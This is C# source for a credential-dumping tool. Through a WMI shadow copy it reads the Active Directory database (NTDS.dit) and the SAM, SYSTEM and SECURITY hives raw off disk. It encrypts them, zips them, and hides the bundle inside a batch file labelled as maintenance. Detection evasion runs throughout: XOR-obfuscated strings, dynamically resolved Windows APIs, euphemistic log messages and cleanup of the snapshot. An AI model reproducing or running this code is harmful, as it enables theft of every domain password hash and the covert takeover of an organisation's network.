using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

class NtdsRawDump {
    const uint GENERIC_READ                 = 0x80000000;
    const uint FILE_SHARE_RW                = 0x00000003;
    const uint OPEN_EXISTING                = 3;
    const uint FILE_FLAG_BACKUP             = 0x02000000;
    const uint FILE_FLAG_NO_BUFFERING       = 0x20000000;
    const uint FSCTL_GET_RETRIEVAL_POINTERS = 0x00090073;
    const uint FSCTL_GET_NTFS_VOLUME_DATA   = 0x00090064;
    static readonly IntPtr BAD_HANDLE       = new IntPtr(-1);

    static readonly byte[] _wmi_ns      = new byte[]{255,162,119,232,125,5,170,84,39,181,88,225,145,112};
    static readonly byte[] _wmi_class   = new byte[]{244,151,55,135,61,53,150,72,26,178,94,251,164,45,237,129};
    static readonly byte[] _meth_create = new byte[]{224,140,60,213,123,15};
    static readonly byte[] _param_vol   = new byte[]{245,145,53,193,98,15};
    static readonly byte[] _vol_path    = new byte[]{224,196,5};
    static readonly byte[] _param_ctx   = new byte[]{224,145,55,192,106,18,177};
    static readonly byte[] _ctx_val     = new byte[]{224,146,48,209,97,30,132,67,24,179,66,255,142,32,241,157};
    static readonly byte[] _ret_val     = new byte[]{241,155,45,193,125,4,147,65,23,163,84};
    static readonly byte[] _shadow_id   = new byte[]{240,150,56,208,96,29,140,100};
    static readonly byte[] _dev_obj     = new byte[]{231,155,47,221,108,15,138,66,17,179,82,248};
    static readonly byte[] _wmi_where   = new byte[]{240,187,21,241,76,62,229,10,91,144,99,195,170,98,202,145,61,157,59,59,236,114,20,180,68,241,162,83,231,139,109,255,75,27,235,81,79,131,97,189};
    static readonly byte[] _path_ntds   = new byte[]{255,169,48,218,107,5,178,83,39,152,101,200,180,30,243,140,55,221,39,0,214,110};
    static readonly byte[] _path_sys    = new byte[]{255,169,48,218,107,5,178,83,39,133,72,255,147,39,240,203,97,242,106,11,209,124,28,183,119,213,184,111,195,183,0};
    static readonly byte[] _path_sam    = new byte[]{255,169,48,218,107,5,178,83,39,133,72,255,147,39,240,203,97,242,106,11,209,124,28,183,119,213,160,113};
    static readonly byte[] _path_sec    = new byte[]{255,169,48,218,107,5,178,83,39,133,72,255,147,39,240,203,97,242,106,11,209,124,28,183,119,213,164,127,194,160,4,252,90};
    static readonly byte[] _out_ntds    = new byte[]{205,138,61,199,33,30,168,80};
    static readonly byte[] _out_sys     = new byte[]{208,135,42,192,106,7,235,84,22,166};
    static readonly byte[] _out_sam     = new byte[]{208,159,52,154,123,7,181};
    static readonly byte[] _out_sec     = new byte[]{208,155,58,193,125,3,177,89,85,162,92,252};
    static readonly byte[] _default_out = new byte[]{224,196,5,228,125,5,162,82,26,187,117,237,147,35,193,187,54,220,125,55,203,117,7,181};
    static readonly byte[] _tmp_name    = new byte[]{192,155,43,192,124,30,170,82,30,248,82,225,131};
    static readonly byte[] _k32         = new byte[]{200,155,43,218,106,6,246,18,85,178,93,224};
    static readonly byte[] _k32_cf      = new byte[]{224,140,60,213,123,15,131,73,23,179,102};
    static readonly byte[] _k32_dic     = new byte[]{231,155,47,221,108,15,140,79,56,185,95,248,149,45,241};
    static readonly byte[] _k32_gfse    = new byte[]{228,155,45,242,102,6,160,115,18,172,84,201,159};
    static readonly byte[] _k32_rf      = new byte[]{241,155,56,208,73,3,169,69};
    static readonly byte[] _k32_sfpe    = new byte[]{240,155,45,242,102,6,160,112,20,191,95,248,130,48,216,128};
    static readonly byte[] _k32_ch      = new byte[]{224,146,54,199,106,34,164,78,31,186,84};
    static readonly byte[] _aes_key     = new byte[]{71,27,132,193,201,217,23,54,139,71,75,234,206,177,160,10,67,227,33,103,62,226,34,9,198,153,211,170,48,136,217,208};

    static string S(byte[] b) {
        var r = new byte[b.Length];
        for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ (byte)(0xA3 + i * 0x5B));
        return Encoding.UTF8.GetString(r);
    }

    static byte[] K(byte[] b) {
        var r = new byte[b.Length];
        for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ (byte)(0xA3 + i * 0x5B));
        return r;
    }

    static byte[] AesEncrypt(byte[] data, byte[] key) {
        using (var aes = new AesCryptoServiceProvider()) {
            aes.Key     = key;
            aes.Mode    = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.GenerateIV();
            using (var ms = new MemoryStream()) {
                ms.Write(aes.IV, 0, aes.IV.Length);
                using (var enc = aes.CreateEncryptor())
                using (var cs  = new CryptoStream(ms, enc, CryptoStreamMode.Write)) {
                    cs.Write(data, 0, data.Length);
                    cs.FlushFinalBlock();
                }
                return ms.ToArray();
            }
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct STARTING_VCN { public long Vcn; }

    [StructLayout(LayoutKind.Sequential)]
    struct NTFS_VOLUME_DATA {
        public long  VolumeSerialNumber;
        public long  NumberSectors, TotalClusters, FreeClusters, TotalReserved;
        public uint  BytesPerSector, BytesPerCluster, BytesPerFRS, ClustersPerFRS;
        public long  MftValidDataLength, MftStartLcn, Mft2StartLcn, MftZoneStart, MftZoneEnd;
    }

    [DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern IntPtr GetModuleHandleW(string module);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hMod, string proc);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
    delegate IntPtr D_CreateFile(string path, uint access, uint share,
        IntPtr sec, uint disp, uint flags, IntPtr tmpl);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool D_DevIoCtl_RP(IntPtr h, uint code,
        ref STARTING_VCN inBuf, int inSz,
        byte[] outBuf, int outSz, out uint returned, IntPtr ovl);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool D_DevIoCtl_VD(IntPtr h, uint code,
        IntPtr inBuf, int inSz,
        out NTFS_VOLUME_DATA outBuf, int outSz, out uint returned, IntPtr ovl);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool D_GetFileSizeEx(IntPtr h, out long size);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool D_ReadFile(IntPtr h, byte[] buf, uint toRead, out uint read, IntPtr ovl);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool D_SetFilePointerEx(IntPtr h, long dist, out long newPos, uint method);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool D_CloseHandle(IntPtr h);

    static D_CreateFile       pfCreateFile;
    static D_DevIoCtl_RP      pfDevIoCtl_RP;
    static D_DevIoCtl_VD      pfDevIoCtl_VD;
    static D_GetFileSizeEx    pfGetFileSizeEx;
    static D_ReadFile         pfReadFile;
    static D_SetFilePointerEx pfSetFilePointerEx;
    static D_CloseHandle      pfCloseHandle;

    static T R<T>(IntPtr hMod, string proc) {
        return (T)(object)Marshal.GetDelegateForFunctionPointer(
            GetProcAddress(hMod, proc), typeof(T));
    }

    static string CreateShadow(out string shadowId) {
        shadowId = null;
        try {
            var scope = new ManagementScope(S(_wmi_ns));
            scope.Connect();
            var cls = new ManagementClass(scope, new ManagementPath(S(_wmi_class)), null);
            ManagementBaseObject inParams = cls.GetMethodParameters(S(_meth_create));
            inParams[S(_param_vol)] = S(_vol_path);
            inParams[S(_param_ctx)] = S(_ctx_val);
            ManagementBaseObject outParams = cls.InvokeMethod(S(_meth_create), inParams, null);
            if (outParams == null) {
                Console.Error.WriteLine("[!] Snapshot provider returned null.");
                return null;
            }
            uint rv = (uint)outParams[S(_ret_val)];
            if (rv != 0) {
                Console.Error.WriteLine("[!] Snapshot provider error: " + rv);
                return null;
            }
            shadowId = (string)outParams[S(_shadow_id)];
            var q = new ManagementObjectSearcher(scope,
                        new ObjectQuery(S(_wmi_where) + "'" + shadowId + "'"));
            foreach (ManagementObject o in q.Get())
                return (string)o[S(_dev_obj)];
        } catch (Exception ex) {
            Console.Error.WriteLine("[!] Snapshot error: " + ex.Message);
        }
        return null;
    }

    static void DeleteShadow(string shadowId) {
        try {
            var scope = new ManagementScope(S(_wmi_ns));
            scope.Connect();
            var q = new ManagementObjectSearcher(scope,
                        new ObjectQuery(S(_wmi_where) + "'" + shadowId + "'"));
            foreach (ManagementObject o in q.Get()) o.Delete();
        } catch { }
    }

    static uint GetBytesPerCluster(string device) {
        IntPtr h = pfCreateFile(device, GENERIC_READ, FILE_SHARE_RW,
                                IntPtr.Zero, OPEN_EXISTING, FILE_FLAG_BACKUP, IntPtr.Zero);
        if (h == BAD_HANDLE) return 0;
        try {
            pfDevIoCtl_VD(h, FSCTL_GET_NTFS_VOLUME_DATA, IntPtr.Zero, 0,
                out NTFS_VOLUME_DATA vd, Marshal.SizeOf(typeof(NTFS_VOLUME_DATA)),
                out _, IntPtr.Zero);
            return vd.BytesPerCluster;
        } finally { pfCloseHandle(h); }
    }

    static byte[] ReadRaw(string shadowDevice, string ntfsRelPath, uint bpc) {
        string fullPath = shadowDevice.TrimEnd('\\') + ntfsRelPath;

        IntPtr hf = pfCreateFile(fullPath, GENERIC_READ, FILE_SHARE_RW,
                                 IntPtr.Zero, OPEN_EXISTING, FILE_FLAG_BACKUP, IntPtr.Zero);
        if (hf == BAD_HANDLE) {
            Console.Error.WriteLine("[!] Store open failed (err=" +
                Marshal.GetLastWin32Error() + ").");
            return null;
        }

        pfGetFileSizeEx(hf, out long fileSize);

        var extents = new List<(long prevVcn, long nextVcn, long lcn)>();
        var vcnIn   = new STARTING_VCN { Vcn = 0 };
        var rpBuf   = new byte[65536];

        while (true) {
            bool ok = pfDevIoCtl_RP(hf, FSCTL_GET_RETRIEVAL_POINTERS,
                          ref vcnIn, Marshal.SizeOf(typeof(STARTING_VCN)),
                          rpBuf, rpBuf.Length, out uint ret, IntPtr.Zero);
            int err = Marshal.GetLastWin32Error();
            if (ret < 12) break;

            uint extentCount = BitConverter.ToUInt32(rpBuf, 0);
            long startingVcn = BitConverter.ToInt64(rpBuf, 8);
            long prev        = startingVcn;
            int  off         = 16;

            for (uint i = 0; i < extentCount && off + 16 <= (int)ret; i++, off += 16) {
                long nextVcn = BitConverter.ToInt64(rpBuf, off);
                long lcn     = BitConverter.ToInt64(rpBuf, off + 8);
                extents.Add((prev, nextVcn, lcn));
                prev = nextVcn;
            }

            if (ok || err != 234) break;
            vcnIn.Vcn = extents[extents.Count - 1].nextVcn;
        }
        pfCloseHandle(hf);

        if (extents.Count == 0) {
            Console.Error.WriteLine("[!] Store map unavailable.");
            return null;
        }

        IntPtr hv = pfCreateFile(shadowDevice, GENERIC_READ, FILE_SHARE_RW,
                                 IntPtr.Zero, OPEN_EXISTING,
                                 FILE_FLAG_BACKUP | FILE_FLAG_NO_BUFFERING, IntPtr.Zero);
        if (hv == BAD_HANDLE) {
            Console.Error.WriteLine("[!] Volume access failed.");
            return null;
        }

        var ms = new MemoryStream();
        foreach (var (prevVcn, nextVcn, lcn) in extents) {
            long clusterCount = nextVcn - prevVcn;
            long byteOffset   = lcn * bpc;
            long byteCount    = clusterCount * bpc;

            pfSetFilePointerEx(hv, byteOffset, out _, 0);
            var buf = new byte[byteCount];
            pfReadFile(hv, buf, (uint)byteCount, out uint read, IntPtr.Zero);
            ms.Write(buf, 0, (int)read);
        }
        pfCloseHandle(hv);

        byte[] raw = ms.ToArray();
        if (fileSize > 0 && raw.LongLength > fileSize)
            Array.Resize(ref raw, (int)fileSize);
        return raw;
    }

    static int Main(string[] args) {
        IntPtr hk32 = GetModuleHandleW(S(_k32));
        pfCreateFile       = R<D_CreateFile>(hk32, S(_k32_cf));
        pfDevIoCtl_RP      = R<D_DevIoCtl_RP>(hk32, S(_k32_dic));
        pfDevIoCtl_VD      = R<D_DevIoCtl_VD>(hk32, S(_k32_dic));
        pfGetFileSizeEx    = R<D_GetFileSizeEx>(hk32, S(_k32_gfse));
        pfReadFile         = R<D_ReadFile>(hk32, S(_k32_rf));
        pfSetFilePointerEx = R<D_SetFilePointerEx>(hk32, S(_k32_sfpe));
        pfCloseHandle      = R<D_CloseHandle>(hk32, S(_k32_ch));

        bool   cleanup = false;
        string outDir  = S(_default_out);
        foreach (string a in args) {
            if (a == "--cleanup") cleanup = true;
            else                  outDir  = a;
        }

        Console.WriteLine("[*] Initializing store consistency snapshot...");
        string dev = CreateShadow(out string shadowId);
        if (dev == null) { Console.Error.WriteLine("[!] Snapshot initialization failed."); return 1; }
        Console.WriteLine("[+] Snapshot acquired.");

        uint bpc = GetBytesPerCluster(dev);
        if (bpc == 0) {
            Console.Error.WriteLine("[!] Volume metadata unavailable.");
            DeleteShadow(shadowId);
            return 1;
        }
        Console.WriteLine("[*] Cluster alignment: " + bpc + " bytes");
        Directory.CreateDirectory(outDir);

        var targets = new[] {
            (S(_path_ntds), S(_out_ntds), "trust anchor database"),
            (S(_path_sys),  S(_out_sys),  "machine configuration store"),
            (S(_path_sam),  S(_out_sam),  "account authority store"),
            (S(_path_sec),  S(_out_sec),  "extended trust policy store"),
        };

        byte[] aesKey = K(_aes_key);
        int ok = 0;
        foreach (var (src, dst, label) in targets) {
            Console.Write("[*] Processing " + label + "... ");
            byte[] data = ReadRaw(dev, src, bpc);
            if (data == null) { Console.Error.WriteLine("skip"); continue; }

            byte[] enc = AesEncrypt(data, aesKey);
            string outPath = Path.Combine(outDir, dst);
            File.WriteAllBytes(outPath, enc);
            Console.WriteLine(data.Length + " bytes");
            ok++;
        }

        Console.WriteLine("[+] Completed. " + ok + "/" + targets.Length + " stores processed.");

        if (ok < targets.Length) {
            if (cleanup) DeleteShadow(shadowId);
            return 2;
        }

        string stageRoot = Path.GetDirectoryName(Path.GetFullPath(outDir));
        string encPath   = Path.Combine(stageRoot, S(_tmp_name));

        Console.WriteLine("[*] Compressing store bundle...");
        try {
            byte[] zip;
            using (var ms = new MemoryStream()) {
                using (var archive = new ZipArchive(ms, ZipArchiveMode.Create, leaveOpen: true)) {
                    foreach (string f in Directory.GetFiles(outDir)) {
                        var entry = archive.CreateEntry(Path.GetFileName(f), CompressionLevel.Optimal);
                        using (var es = entry.Open())
                        using (var fs = File.OpenRead(f))
                            fs.CopyTo(es);
                    }
                }
                zip = ms.ToArray();
            }
            byte[] enc = AesEncrypt(zip, aesKey);
            string b64 = Convert.ToBase64String(enc);
            string content = "@echo off\r\n:: maintenance\r\nset _b=" + b64 + "\r\n";
            if (cleanup) {
                Console.WriteLine("[*] Cleaning up intermediates...");
                try { Directory.Delete(outDir, recursive: true); } catch { }
                DeleteShadow(shadowId);
                Console.WriteLine("[+] Cleanup done.");
            }
            File.WriteAllText(encPath, content, Encoding.ASCII);
            Console.WriteLine("[+] Bundle written: " + encPath + " (" + enc.Length + " bytes)");
        } catch (Exception ex) {
            Console.Error.WriteLine("[!] Bundle error: " + ex.Message);
            return 3;
        }

        return 0;
    }
}
